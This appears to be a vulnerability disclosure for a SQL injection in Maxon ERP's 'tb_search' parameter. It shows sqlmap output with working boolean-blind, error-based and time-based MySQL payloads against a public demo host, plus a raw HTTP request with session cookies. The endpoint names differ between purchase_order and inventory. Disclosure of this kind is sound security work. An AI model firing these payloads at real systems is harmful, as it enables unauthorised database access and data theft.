## Maxon ERP Software did not filter the parameters entered in the management center page purchase information purchase order, resulting in the existence of SQL injection vulnerabilities
* http://demo.maxonerp.com/index.php/purchase_order/browse_data?tb_search=123*&page=1&rows=10

We can use sqlmap to validate：
```
in the parameters：tb_search
sqlmap identified the following injection point(s) with a total of 557 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)
    Payload: http://demo.maxonerp.com:80/index.php/inventory/browse_data?tb_search=123') AND MAKE_SET(8692=8692,5675) AND ('PJtz' LIKE 'PJtz&page=1&rows=10

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://demo.maxonerp.com:80/index.php/inventory/browse_data?tb_search=123') AND (SELECT 2183 FROM(SELECT COUNT(*),CONCAT(0x7178767671,(SELECT (ELT(2183=2183,1))),0x716b717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('uwEb' LIKE 'uwEb&page=1&rows=10

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://demo.maxonerp.com:80/index.php/inventory/browse_data?tb_search=123') AND (SELECT 8227 FROM (SELECT(SLEEP(5)))xxVr) AND ('xVYh' LIKE 'xVYh&page=1&rows=10
---
```
![](https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/sqlmap.png)
* SQL injection of the database version information
![](https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dbversion.png)
* SQL injection of database path information
![](https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dbpath.png)
### SQL injection data packet
```
GET /index.php/inventory/browse_data?tb_search=123&page=1&rows=10 HTTP/1.1
Host: demo.maxonerp.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.995310737.1667460803; _gid=GA1.2.778562749.1667460803; __gads=ID=44d315f8abc6a8d9-22d56d3affd700f7:T=1667460803:RT=1667460803:S=ALNI_MYh6leInNXjg72LZfWBATADsf2KVQ; __gpi=UID=00000b743408aed2:T=1667460803:RT=1667482612:S=ALNI_MbDlATt_GUCBEUQQ0koQ0nZIMJ9Lw; ci_session=f662b08c6b19441249ee774c485e480aaa2cb095
Connection: close
```
